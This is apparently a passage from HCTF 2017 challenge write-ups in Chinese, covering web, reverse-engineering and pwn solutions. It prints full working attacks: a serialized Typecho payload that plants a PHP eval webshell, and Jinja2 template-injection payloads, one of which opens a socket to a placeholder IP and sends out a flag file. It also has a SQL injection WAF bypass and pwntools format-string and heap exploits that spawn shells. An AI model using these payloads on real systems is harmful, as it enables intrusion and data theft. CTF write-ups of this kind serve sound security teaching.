__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCd1cGxvYWRzL2MwMTQucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtjXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ== Referer: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php 即可在uploads目录下创建一个名为c014.php的webshell之后会发现命令执行的函数好像都没有回显，因为我基本上都禁用掉了这里用php自带的列目录 $c = new DirectoryIterator(\"glob:///*\"); foreach($c as $cc) { echo $cc,\"\"; } 发现根目录下有个 /flag_is_here 的文件夹然后读取这个文件夹下的内容，有一个flag文件 echo file_get_contents('/flag_is_here/flag'); get flag~ 这题我一开始是想考显注绕过waf `/union([\\s\\S]+)select([\\s\\S]+)from/i` 贴一下我预期的显注poc `id=1=2|@c:=(select(1))union(select@c)` 读目录的exp为: `id=1=2|@c:=(select(flag)from(flag)where(flagRepeater 题目是根据原文魔改的打开题目F12发现server为 Server: Werkzeug/0.12.2 Python/2.7.12 然后发现输入x就返回x was not found.差不多可以想到jinja模板注入问题测试 secret={{2-1}} 返回1 was not found.即可验证由于也是黑名单过滤，绕过方式看师傅们的姿势request.args过滤了 空格(%20)，回车(%0a)，'__','[',']','os','\"',\"|[a-z]\" 直接构造是可以bypass的空格可以用tab(%09)绕过，|后不允许接a-z可以用%0c，tab等绕过，os可以通过python中exec绕过但是这题过滤仅限于request.args但是不允许post简单的办法是可以用request.cookies来绕过只能读文件的方法要找flag首先需要先到/etc/passwd看到有hctf用户,然后读取/home/hctf/.bash_history,发现flag路径/h3h3_1s_your_flag/flag,在读取flag随便列几种解题方法1.不用blask_list里的符号 secret={%set%0ca,b,c,d,e,f,g,h,i=request|%0cattr(request.args.class|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))|%0cattr(request.args.mro|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))%}{{(i|%0cattr(request.args.subc|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&class=%s%sclass%s%s&mro=%s%smro%s%s&subc=%s%ssubclasses%s%s&usc=_&file=/tmp/foo.py&write=w&a=_&payload=import%0csocket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xxx.xxx.xxx.xxx',2333));s.send(open('/h3h3_1s_your_flag/flag').read()); 2.exec构造绕过'os'执行os系统命令 `a='import\\x0co'+'s;o'+'s.system(\\'ls${IFS}/\\')';exec(a)` 3.通过request.cookies Url: http://repeater.2017.hctf.io/?secret={{request|%0cattr(request.cookies.class)|%0cattr(request.cookies.mro)|%0clast()|%0cattr(request.cookies.sub)()|%0cattr(request.cookies.getitem)(40)(request.cookies.file)|%0cattr(request.cookies.read)()}} Cookie: file=/h3h3_1s_your_flag/flag;class=__class__;mro=__mro__;sub=__subclasses__;getitem=__getitem__;read=read; Who are you? 进入界面，右上登录，Steam 账号授权。 然后进Home发现有infomation和shop。shop里可以买flag推测但显示余额不足。 购买动作的URL为http://gogogo.2017.hctf.io/shop/3，修改3为4可以发现调试模式没关，源码泄露。 public function buy(Request $request) { $itemId = $request->route('id'); $item = Item::find($itemId); $prize = $item->prize; $balance = Info::find(Auth::id())->amount; if ($balance >= $prize) { return view('message', ['message' => $item->note]); } return view('message', ['message' => 'Sorry Sir! You don\\'t have enough money']); } 得知后端框架为 Laravel，账户余额字段名为amount。 infomation页尝试把表单中的name字段改成amount字段并提交，即可充值。 购买拿到flag：hctf{csgo_is_best_fps_game_dA3jf}。 推测没有限定提交表单的参数，可以反推后端代码可能为。 public function update(Request $request) { $user = Info::where('id', Auth::id())->update($request->all()); } Laravel 使用update方法批量赋值时应在Model中声明fillable白名单或者guard黑名单限制参数，或者使用$request->only()来限制。 Deserted place Deserted place Description maybe nothing here flag in admin cookie Now Score 820.35 Team solved 3 出题思路来自于一个比较特别的叫做SOME的攻击方式，全名Same Origin Method Execution，这是一种2015年被人提出来的攻击方式，可以用来执行同源环境下的任意方法，2年前就有人做了分析。 原paperhttp://blog.safedog.cn/?p=13https://lightless.me/archives/same-origin-method-exection.html 这里我就不讨论具体的SOME攻击，稍后我会在博客等地方更新具体的分析。 回到题目。 打开题目主要功能有限： 1、登陆 2、注册 3、修改个人信息（修改个人信息后按回车更新自己的信息）、 4、获取随机一个人的信息，并把它的信息更新给我自己 简单测试可以发现，个人信息页面存在self-xss，但问题就在于怎么能更新admin的个人信息。 仔细回顾站内的各种信息，我们能发现所有的更新个人信息都是通过开启子窗口来实现的。 edit.php里面有一个类似于jsonp的接口可以执行任意函数，简单测试可以发现这里正则匹配了.\\w+，这意味这我们只能执行已有的js函数，我们可以看看后台的代码。 $callback = $_GET['callback']; preg_match(\"/\\w+/i\", $callback, $matches); ... echo \"\"; echo $matches[0].\"();\"; echo \"\"; 已有的函数一共有3个 function UpdateProfile(){ var username = document.getElementById('user').value; var email = document.getElementById('email').value; var message = document.getElementById('mess').value; window.opener.document.getElementById(\"email\").innerHTML=\"Email: \"+email; window.opener.document.getElementById(\"mess\").innerHTML=\"Message: \"+message; console.log(\"Update user profile success...\"); window.close(); } function EditProfile(){ document.onkeydown=function(event){ if (event.keyCode == 13){ UpdateProfile(); } } } function RandomProfile(){ setTimeout('UpdateProfile()', 1000); } 如果执行UpdateProfile，站内就会把子窗口的内容发送到父窗口中。但是我们还是没办法控制修改的内容。 回顾站内逻辑，当我们点击click me，首先请求/edit.php?callback=RandomProfile，然后跳转至任意http://hctf.com/edit.php?callback=RandomProfile&user=xiaoming，然后页面关闭并，更新信息到当前用户上，假设这里user是我们设定的还有恶意代码的user，那我们就可以修改admin的信息了，但，怎么能让admin打开这个页面呢？ 我们可以尝试一个，如果直接打开edit.php?callback=RandomProfile&user=xiaoming 报错了，不是通过open打开的页面，寻找不到页面内的window.opener对象，也就没办法做任何事。 这里我们只有通过SOME，才能操作同源下的父窗口，首先我们得熟悉同源策略，同源策略规定，只有同源下的页面才能相互读写，如果通过windows.open打开的页面是同源的，那么我们就可以通过window.opener对象来操作父子窗口。 而SOME就是基于这种特性，可以执行同源下的任意方法。 最终payload： vps, 1.html function start_some() { window.open(\"2.html\"); location.replace(\"http://desert.2017.hctf.io/user.php\"); } setTimeout(start_some(), 1000); vps, 2.html function attack() { location.replace(\"http://desert.2017.hctf.io/edit.php?callback=RandomProfile&user=lorexxar\"); } setTimeout(attack, 2000); 在lorexxar账户的message里添加payload getflag! A true man can play a palo one hundred time 题目说明 Question Now you have a balance palo. You can move it left or right. Just play hundred time on it.  Description Get request receive two params 1. move, 0 or 1 2. id, just your token Observation 1. pole position x 2. a value depend on x 3. pole deviate from center Î¸ 4. a value depend on Î¸ Why you failed Î¸ or x > a certain value 总而言之就是个玩棒子的游戏(雾。之所以出现在最后一道请去问关卡规则的设计者。因为ctf本来不应该出现这种问题，所以我有意把这题设计得简单了一点，但是，ctf真是不讲道理，也导致这道题被少量非预期。 其实就是一个非常非常简单的强化学习的问题，甚至不需要强化学习去解。 DQN网络结构定义 import numpy as np import tensorflow as tf import requests import math class DeepQNetwork: def \\_\\_init\\_\\_( self, n_actions, n_features, learning_rate=0.01, reward_decay=0.9, e_greedy=0.9, replace\\_target\\_iter=300, memory_size=500, batch_size=32, e\\_greedy\\_increment=None, output_graph=False, ): self.n_actions = n_actions self.n_features = n_features self.lr = learning_rate self.gamma = reward_decay self.epsilon_max = e_greedy self.replace\\_target\\_iter = replace\\_target\\_iter self.memory_size = memory_size self.batch_size = batch_size self.epsilon_increment = e\\_greedy\\_increment self.epsilon = 0 if e\\_greedy\\_increment is not None else self.epsilon_max \\# total learning step self.learn\\_step\\_counter = 0 \\# initialize zero memory \\[s, a, r, s_\\] self.memory = np.zeros((self.memory_size, n_features * 2 + 2)) \\# consist of \\[target\\_net, evaluate\\_net\\] self.\\_build\\_net() t_params = tf.get_collection('target\\_net\\_params') e_params = tf.get_collection('eval\\_net\\_params') self.replace\\_target\\_op = \\[tf.assign(t, e) for t, e in zip(t_params, e_params)\\] self.sess = tf.Session() if output_graph: \\# $ tensorboard --logdir=logs \\# tf.train.SummaryWriter soon be deprecated, use following tf.summary.FileWriter(\"logs/\", self.sess.graph) self.sess.run(tf.global\\_variables\\_initializer()) self.cost_his = \\[\\] def \\_build\\_net(self): \\# ------------------ build evaluate_net ------------------ self.s = tf.placeholder(tf.float32, \\[None, self.n_features\\], name='s') \\# input self.q_target = tf.placeholder(tf.float32, \\[None, self.n_actions\\], name='Q_target') \\# for calculating loss with tf.variable_scope('eval_net'): \\# c\\_names(collections\\_names) are the collections to store variables c_names, n_l1, w_initializer, b_initializer = \\ \\['eval\\_net\\_params', tf.GraphKeys.GLOBAL_VARIABLES\\], 10, \\ tf.random\\_normal\\_initializer(0., 0.3), tf.constant_initializer(0.1) \\# config of layers \\# first layer. collections is used later when assign to target net with tf.variable_scope('l1'): w1 = tf.get_variable('w1', \\[self.n_features, n_l1\\], initializer=w_initializer, collections=c_names) b1 = tf.get_variable('b1', \\[1, n_l1\\], initializer=b_initializer, collections=c_names) l1 = tf.nn.relu(tf.matmul(self.s, w1) + b1) \\# second layer. collections is used later when assign to target net with tf.variable_scope('l2'): w2 = tf.get_variable('w2', \\[n_l1, self.n_actions\\], initializer=w_initializer, collections=c_names) b2 = tf.get_variable('b2', \\[1, self.n_actions\\], initializer=b_initializer, collections=c_names) self.q_eval = tf.matmul(l1, w2) + b2 with tf.variable_scope('loss'): self.loss = tf.reduce_mean(tf.squared_difference(self.q_target, self.q_eval)) with tf.variable_scope('train'): self.\\_train\\_op = tf.train.RMSPropOptimizer(self.lr).minimize(self.loss) \\# ------------------ build target_net ------------------ self.s_ = tf.placeholder(tf.float32, \\[None, self.n_features\\], name='s_') \\# input with tf.variable_scope('target_net'): \\# c\\_names(collections\\_names) are the collections to store variables c_names = \\['target\\_net\\_params', tf.GraphKeys.GLOBAL_VARIABLES\\] \\# first layer. collections is used later when assign to target net with tf.variable_scope('l1'): w1 = tf.get_variable('w1', \\[self.n_features, n_l1\\], initializer=w_initializer, collections=c_names) b1 = tf.get_variable('b1', \\[1, n_l1\\], initializer=b_initializer, collections=c_names) l1 = tf.nn.relu(tf.matmul(self.s_, w1) + b1) \\# second layer. collections is used later when assign to target net with tf.variable_scope('l2'): w2 = tf.get_variable('w2', \\[n_l1, self.n_actions\\], initializer=w_initializer, collections=c_names) b2 = tf.get_variable('b2', \\[1, self.n_actions\\], initializer=b_initializer, collections=c_names) self.q_next = tf.matmul(l1, w2) + b2 def store_transition(self, s, a, r, s_): if not hasattr(self, 'memory_counter'): self.memory_counter = 0 transition = np.hstack((s, \\[a, r\\], s_)) \\# replace the old memory with new memory index = self.memory_counter % self.memory_size self.memory\\[index, :\\] = transition self.memory_counter += 1 def choose_action(self, observation): \\# to have batch dimension when feed into tf placeholder observation = observation\\[np.newaxis, :\\] if np.random.uniform() self.memory_size: sample_index = np.random.choice(self.memory_size, size=self.batch_size) else: sample_index = np.random.choice(self.memory_counter, size=self.batch_size) batch_memory = self.memory\\[sample_index, :\\] q_next, q_eval = self.sess.run( \\[self.q_next, self.q_eval\\], feed_dict={ self.s_: batch_memory\\[:, -self.n_features:\\], \\# fixed params self.s: batch_memory\\[:, :self.n_features\\], \\# newest params }) \\# change q\\_target w.r.t q\\_eval's action q_target = q_eval.copy() batch_index = np.arange(self.batch_size, dtype=np.int32) eval\\_act\\_index = batch_memory\\[:, self.n_features\\].astype(int) reward = batch_memory\\[:, self.n_features + 1\\] q_target\\[batch_index, eval\\_act\\_index\\] = reward + self.gamma * np.max(q_next, axis=1) \\# train eval network _, self.cost = self.sess.run(\\[self.\\_train\\_op, self.loss\\], feed_dict={self.s: batch_memory\\[:, :self.n_features\\], self.q_target: q_target}) self.cost_his.append(self.cost) \\# increasing epsilon self.epsilon = self.epsilon + self.epsilon_increment if self.epsilon 学习迭代 x_threshold = 2.4 theta\\_threshold\\_radians = 1/15*math.pi RL = DeepQNetwork(n_actions=2, n_features=4, learning_rate=0.01, e_greedy=0.9, replace\\_target\\_iter=100, memory_size=2000, e\\_greedy\\_increment=0.001,) total_steps = 0 for i_episode in range(100): json_req = requests.get(url=url, params={'id': token, 'move': 0}).json() observation = json_req\\['observation'\\] ep_r = 0 while True: action = RL.choose_action(np.array(observation)) json_req = requests.get(url=url, params={'id': token, 'move': action}).json() try: observation_ = json_req\\['observation'\\] except KeyError: pass print(observation) done = not json_req\\['status'\\] \\# the smaller theta and closer to center the better x, x_dot, theta, theta_dot = observation_ r1 = (x_threshold - abs(x))/x_threshold - 0.8 r2 = (theta\\_threshold\\_radians - abs(theta))/theta\\_threshold\\_radians - 0.5 reward = r1 + r2 RL.store_transition(observation, action, reward, observation_) ep_r += reward if total_steps > 1000: RL.learn() if done: count = json_req\\['count'\\] if count == 100: print(json_req\\['flag'\\]) else: print('count:', json_req\\['count'\\]) break observation = observation_ total_steps += 1 Bin Evr_Q 0x00 写在前面 　　这题一开始是准备TLS+SMC+反调试的，发现放在第一题有些不太合适，就把SMC的调用部分删掉了。　（其实留下了彩蛋，smc的实现我没有删XD）　　　设计思路：　　用TLS检测工具进程和调试器，进入主函数后先检测用户名，通过后检测StartCode(即flag)，最后输入'Y'确认CM。　　　　部分细节： Win10的TLS在vs17上有点小Bug，只能在Debug模式下跑起来，于是没有选择Release版本，如果给大家带来困扰这里十分抱歉。 用户名注册存在多解，原因是我把进位值舍去了（输入'I'也能通过username验证哦） StartCode部分先验证长度为35Step1: 全体 xor 0x76Step2: [7:14]每个字节先异或0xAD, 再将0b10101010位与0b01010101位互换Step3: [14:21]每个字节先异或0xBE, 再将0b11001100位与0b00110011位互换Step4: [21:28]每个字节先异或0xAD, 再将0b11110000位于0b00001111位互换 Step2~4加密前先调用ntdll!NtQueryInformationProcess, 各检查1种标志(7, 30，31) 比较简单的做法直接用ida看了，cuz没有造成任何静态反编译的难度 0x01 Wp import random import os import hashlib enc_flag = [30, 21, 2, 16, 13, 72, 72, 111, 221, 221, 72, 100, 99, 215, 46, 44, 254, 106, 109, 42, 242, 111, 154, 77, 139, 75, 30, 30, 14, 14, 14, 14, 14, 14, 11] dec_flag = [0] * len(enc_flag) #///////////////////////////////////////////////// def dec0_f(dec_t, enc_t, num): for i in range(num): dec_t[i] = chr(enc_t[i] ^ 0x76) return dec_t #///////////////////////////////////////////////// def dec1_f(dec_t, enc_t, num): for i in range(num): v1 = (enc_t[i] & 0x55) > 1) & 0x55 enc_t[i] = v1 | v2 dec_t[i] = enc_t[i] ^ 0xAD return dec_t #///////////////////////////////////////////////// def dec2_f(dec_t, enc_t, num): for i in range(num): v1 = (enc_t[i] & 0x33) > 2) & 0x33 enc_t[i] = v1 | v2 dec_t[i] = enc_t[i] ^ 0xBE return dec_t #///////////////////////////////////////////////// def dec3_f(dec_t, enc_t, num): for i in range(num): v1 = (enc_t[i] & 0xF) > 4) & 0xF enc_t[i] = v1 | v2 dec_t[i] = enc_t[i] ^ 0xEF return dec_t #///////////////////////////////////////////////// def dec_f(dec_flag, enc_flag): for i in range(len(enc_flag)): dec_flag[i] = enc_flag[i] dec_flag[21:28] = dec3_f(dec_flag[21:28], enc_flag[21:28], 7) dec_flag[14:21] = dec2_f(dec_flag[14:21], enc_flag[14:21], 7) dec_flag[7:14] = dec1_f(dec_flag[7:14], enc_flag[7:14], 7) dec_flag = dec0_f(dec_flag, dec_flag, 35) #///////////////////////////////////////////////// dec_f(dec_flag, enc_flag) print ''.join(dec_flag) flag: hctf{>>D55_CH0CK3R_B0o0M!-xxxxxxxx} ez_crackme 考察对简单解释器的逆向能力。 加密解密过程 box=\\[\\] for i in range(32): x=(x+51)%32 box.append(x) 先用如上方式初始化一个box。 用这个box将输入的明文进行乱序。 head = (out\\[0\\]&0xe0)>>5 for i in range(31): out\\[i\\] = ((out\\[i\\]&0x1f)>5) out\\[31\\] = ((out\\[31\\]&0x1f)然后用如上方式，将乱序后的结果进行整体循环左移3位。 key = 'deadbeef'.decode('hex') for i in range(32): out2.append(out\\[i\\]^((ord(key\\[i%4\\])+i)&0xff)) 然后利用key和下标i对左移后的结果做异或即可。 完整python加密解密脚本： key = 'deadbeef'.decode('hex') def encrypt(flag): out=\\[\\] out2=\\[\\] x=0#gen box box=\\[\\] for i in range(32): x=(x+51)%32 box.append(x) for i in range(32): out.append(ord(flag\\[box\\[i\\]\\])) head = (out\\[0\\]&0xe0)>>5 for i in range(31): out\\[i\\] = ((out\\[i\\]&0x1f)>5) out\\[31\\] = ((out\\[31\\]&0x1f)>3)+((out\\[i-1\\]&0x7)>3)+(tail定义了一些寄存器以及变量，解释器指令，以及指令后面的变量种类。一个完整的指令由高7位的类型和低1位的变量类型组成。 rr表示op reg,reg,rn表示op reg,num。 用宏写的解释代码 char code\\[\\] = { \\_lea\\_ch | rr,_ebx, _flag, \\_my\\_xor | rr,_ecx, _ecx, \\_my\\_xor | rr,_eax,_eax, \\_my\\_xor | rr,_edx,_edx, loop, _add | rn,_eax, 51, _mod | rn,_eax, 32, \\_lea\\_ch | rr,\\_t\\_chp, _ebx, \\_add\\_pch | rr,\\_t\\_chp,_eax, \\_ldr\\_ch | rr,\\_t\\_int,\\_t\\_chp, _mov | rr,_edx,\\_t\\_int, _push | rr,_esp,_edx, _add | rn,_ecx, 1, _cmpl | rn, _ecx, 32, loop, \\_my\\_xor | rr,_eax,_eax, \\_lea\\_int | rr,\\_t\\_intp,_esp, \\_add\\_pint | rn,\\_t\\_intp, -32, \\_lea\\_int | rr,_ebx2,\\_t\\_intp, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, \\_my\\_and | rn,_eax, 0xe0, _shr | rn,_eax, 5, _mov | rr,_edx,_eax, \\_my\\_xor | rr,_ecx, _ecx, loop, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, \\_my\\_and | rn,_eax, 0x1f, _shl | rn,_eax, 3, _push | rr,_esp,_eax, \\_lea\\_int | rr,\\_t\\_intp,_esp, \\_add\\_pint | rn,\\_t\\_intp, -32, \\_lea\\_int | rr,_ebx2,\\_t\\_intp, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, \\_my\\_and | rn,_eax, 0xe0, _shr | rn,_eax, 5, _pop | rr,_esp,\\_t\\_int, _add | rr,\\_t\\_int,_eax, _push | rr,_esp,\\_t\\_int, _add | rn,_ecx, 1, _cmpl | rn, _ecx, 31, loop, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, \\_my\\_and | rn,_eax, 0x1f, _shl | rn,_eax, 3, _add | rr,_eax,_edx, _push | rr,_esp,_eax, \\_my\\_xor | rr,_ecx, _ecx, _mov32 | rr,_edx, _key, loop, \\_lea\\_int | rr,\\_t\\_intp,_esp, \\_add\\_pint | rn,\\_t\\_intp, -32, \\_lea\\_int | rr,_ebx2,\\_t\\_intp, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, _push | rr,_esp,_eax, _mov | rr,_eax,_edx, _add | rr,_eax, _ecx, _pop | rr,_esp,\\_t\\_int, \\_my\\_xor | rr,\\_t\\_int,_eax, _push | rr,_esp,\\_t\\_int, _ror | rn,_edx, 8, _add | rn,_ecx, 1, _cmpl | rn, _ecx, 32, loop, \\_my\\_xor | rr,_ecx, _ecx, \\_my\\_xor | rr,_edx,_edx, \\_lea\\_ch | rr,_ebx,_enc, loop, \\_lea\\_ch | rr,\\_t\\_chp, _ebx, \\_add\\_pch | rr,\\_t\\_chp, _ecx, \\_ldr\\_ch | rr,\\_t\\_int,\\_t\\_chp, _mov | rr,_eax,\\_t\\_int, _push | rr,_esp,_eax, \\_lea\\_int | rr,\\_t\\_intp,_esp, \\_add\\_pint | rn,\\_t\\_intp, -33, \\_ldr\\_int | rr,\\_t\\_int,\\_t\\_intp, _pop | rr,_esp,_eax, _push | rr,_esp,_eax, _cmpeq | rr,_eax,\\_t\\_int, \\_my\\_or | rr,_edx, _neq, _add | rn,_ecx, 1, _cmpl | rn, _ecx, 32, loop, code_end }; 其中loop的实现是用记录ip的方式来实现的。 完整的程序代码见github。 guestbook 作为第一道pwn，出的应该是比较老套简单的东西。 主要考察点有三个。 利用ebp chain和fmt来实现任意地址写。 对__free_hook的了解。 对$0get shell的了解（最后貌似无人使用，因为有其他方法。） 我的exp: from pwn import * context.log_level = 'debug' context.terminal = \\['terminator','-x','bash','-c'\\] bin = ELF('./guestbook') libc = ELF('./libc.so') def add(name,phone): cn.sendline('1') cn.recvuntil('OK,your guest index is ') idx = int(cn.recvuntil('\\\\n')) cn.recvuntil('?') cn.send(name) cn.recvuntil('?') cn.send(phone) cn.recvuntil('success!\\\\n') return idx def see(idx): cn.sendline('2') cn.recvuntil('index:') cn.sendline(str(idx)) cn.recvuntil('the name:') name = cn.recvuntil('\\\\n') cn.recvuntil('the phone:') phone = cn.recvuntil('\\\\n') cn.recvuntil('===========') return \\[name,phone\\] def delete(idx): cn.sendline('3') cn.recvuntil('index:') cn.sendline(str(idx)) def fmt(pay): idx = add(pay,'1111') see(idx) delete(idx) def fmt2(pay): idx = add(pay,'1111') see(idx) def z(): gdb.attach(cn) raw_input() cn = process('./guestbook') idx = add('%3$x','0') libc_base = int(see(idx)\\[0\\],16)-71 - libc.symbols\\['\\_IO\\_2\\_1\\_stdout_'\\] free_hook = libc_base+0x001B38B0 system = libc_base + libc.symbols\\['system'\\] success('libc_base: '+hex(libc_base)) success('free_hook: '+hex(free_hook)) success('system: '+hex(system)) idx = add('%72$x','1') ebp_2 = int(see(idx)\\[0\\],16)\\# %80$x ebp_1 = ebp_2-0x20\\# %72$x ebp_3 = ebp_2+0x20\\# %88$x success('ebp_1: '+hex(ebp_1)) success('ebp_2: '+hex(ebp_2)) success('ebp_3: '+hex(ebp_3)) pay = '%'+str((ebp_3+8)&0xffff)+'c%80$hn' fmt(pay) pay = '%'+str((ebp_3+2)&0xffff)+'c%72$hn' fmt(pay) pay = '%'+str(((ebp_3+8)&0xffff0000)>>16)+'c%80$hn' fmt(pay) pay = '%'+str((ebp_3)&0xffff)+'c%72$hn' fmt(pay) pay = '%'+str(free_hook&0xffff)+'c%88$hn' fmt(pay) #z() pay = '%'+str(system&0xffff)+'c%90$hn' fmt2(pay) pay = '%'+str((free_hook&0xffff)+2)+'c%88$hn' fmt2(pay) pay = '%'+str((system&0xffff0000)>>16)+'c%90$hn' fmt2(pay) idx=add('get shell','$0\\\\x00') delete(idx) cn.interactive() babyprintf 题目只有malloc和一个printf_chk，printf_chk和printf不同的地方有两点： 不能使用$n不连续的打印 在使用%n的时候会做一系列检查 虽然如此，但leak libc地址还是可以的。这个我想大部分人都想到了。 然后重点就是如何使用程序唯一的堆溢出。没有free的问题 可以通过free topchunk解决，然后很多选手在这都使用了unsortedbin attack拿到shell。 如何通过unsortedbin attack利用我就不多说了, 应该会有其他wp放出。我说一下如何利用 fastbin attack解决这个问题。首先我们能free 一个top chunk，然后有了第一个就能有第二个，不断申请内存或者覆盖top chunk的size可以很轻易的做到这点。同时，我们可以另下面那个的size为0x41，之后申请上面那个堆块就能把下面这个fastbin覆盖了。通过这个0x41的fastbin attack, 我们可以覆盖到位于data段上的stdout指针，具体如下 -------------------- -------------------- freed chunk1 alloced -------------------- -------------------- dummy -> overflow -------------------- -------------------- freed chunk2(0x41) chunk2->fd=target -------------------- -------------------- 当然libc中是存在onegadget的，所以也有人直接去覆盖malloc_hook，这些都可以然后一个比较蛋疼的是libc-2.24的问题，因它为加入了新的对vtable的检验机制。如何绕过呢？这个方法很多，只要记得一点，我们已经能控制“整个“FILE结构体，这点如果稍微去看下源码的话应该能找到很多方法，这里提供一个替换vtable( _IO_file_jumps)到另一个vtable( _IO_str_jumps), 利用两个vtable defalut方法的不同拿到shell的解题脚本(偏移请自行更改)： from pwn import * context.log_level='debug' def pr(size,data): p.sendline(str(size)) p.recv() p.sendline(data) p.recvuntil('result: ') return p.recvuntil('size: ')[:-5] p = process('./babyprintf') p.recvuntil('size: ') for i in range(32): pr(0xff0,'a') p.sendline('0xe00') p.recv() p.sendline('%llx') p.recvuntil('result: ') libc_addr = int('0x'+p.recv(12),16)-0x3c6780 print 'libc: ',hex(libc_addr) p.recvuntil('size: ') pr(8,'a'*0x18+p64(0x1d1)) pr(0x1d0,'1') pr(0x130,'1') pr(0xd00,'1') pr(0xa0,'a'*0xa8+p64(0x61)) pr(0x200,'a') p.sendline('0x60') p.recvuntil('string: ') p.sendline('\\x00'*0x2028+p64(0x41)+p64(0x601062)) p.recv() pr(0x30,'a') system_addr = libc_addr + 0x45390 sh_addr = libc_addr + 0x18cd17 malloc_addr = libc_addr + 0x84130 vtable_addr = libc_addr+0x3c37a0 flag=2|0x8000 fake_stream = p64(flag)+p64(0) fake_stream += p64(0)*2 fake_stream += p64(0) fake_stream += p64(0x7fffffffffffffff) fake_stream = fake_stream.ljust(0x38,'\\x00') fake_stream += p64(sh_addr) fake_stream += p64(sh_addr) fake_stream = fake_stream.ljust(0xc0,'\\x00') fake_stream += p64(0xffffffffffffffff) fake_stream = fake_stream.ljust(0xd8,'\\x00') fake_stream += p64(vtable_addr) fake_stream += p64(malloc_addr) #alloc fake_stream += p64(system_addr) #hook free p.sendline('0x30') p.sendline('a'*14+p64(0x601090)+p64(0)+fake_stream) p.interactive() ar_u_ok 主要考察对ptrace的认识和rc6,rc4的识别 加密解密 真正的加密和解密过程很简单，就是一个标准的rc6，只要把函数中的那个int常量放到google里搜索一下就知道是rc6加密（这个函数的代码被rc4加密了，不不解密是看不到的）。 rc6加密和解密的代码见源码 程序流程 程序首先判断启动参数，如果argc为1，则以debugger身份启动，利用fork分出parent和child。parent作为真正的debugger，child利用execve来启动自身并以父进程的pid作为启动参数。 如果argc为2，说明是debuggee。程序利用puts打印plz_input_flag，但是write的syscall被ptrace hook了。puts的原始内容是乱码，需要debugger对其进行解密。 然后是利用scanf来接收flag。默认是允许输入%48s但是这里ptrace hook了read syscall，检测read syscall触发的次数（在程序开头利用setbuf将stdin和stdout的缓冲调整为0）,从而使flag的真实最大长度为32。 接着是一段判断是否调试者为父进程的代码，没问题的话会调用fclose来关闭之前打开的文件。此处用ptrace hook了close syscall。但是在程序运行前也会调用close syscall。这里利用设置变量的方式，使得在第二次close的时候触发。 触发时执行的代码是利用rc4将两个函数解密，然后patch代码为0xcc使程序停在检测trace代码的下一行，在将其patch成jmp到data段的那段唯一可视的雷军ascii字符处，并将flag传递给rdx，接着继续执行。雷军那段ascii其实是代码。前面的52Mi!是xor eax, 0x21694d32，从而使后面的jne全部成立，R_是push rdx;pop rdi，从而将之前在rdx中的flag传递到rdi中。利用u_这个jne跳转跳过中间的非代码区，最后jmp到encrypt函数中。 encrypt函数就是调用rc6加密，将32位的flag分16位两次加密，最后和enc结果比较。 由于调用了很多的ptrace来实现smc和hook，纯动态分析应该不太可能实现，需要静态分析后patch程序才能使用动态分析。 完整程序见github，由于有smc部分，可能在不同机子上编译结果不正确，所以提供了一个测试用的binary。 ippatsu-nyuukon 0x00 写在前面 　设计思路：　应用层与驱动层通信，在驱动层加密由应用层发送过来的明文后比较flag，并输出结果　　部分细节： 驱动层的分发函数分为2部分，SEND和RECV；SEND：接受从应用层发来的明文并加密，其本体是DESRECV：比较加密后的明文和加密flag 驱动层接受的明文，实际上只有第一次加密结果是正确的 DES后将不可视数据转为hex 加密数据与加密flag比较前先异或同一个随机字节 0x01 wp 跟到分发函数的SEND, 定位加密算法因为DES对称加密算法，所以从ida中抠出来，修改小部分并添加密文+key就可以跑解密脚本了 // desrypt_des.cpp #include #include #define maxn 0x8000 // 理论支持明文长度 //#define ENCODE 0,16,1 // 加密用的宏 #define DECODE 15,-1,-1 // 解密用的宏 // 明文初始置换 char msg_ch[64] = { 58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7 }; // 密钥初始置换 char key_ch[56] = { 57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4 }; // 扩展置换 char msg_ex[48] = { 32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 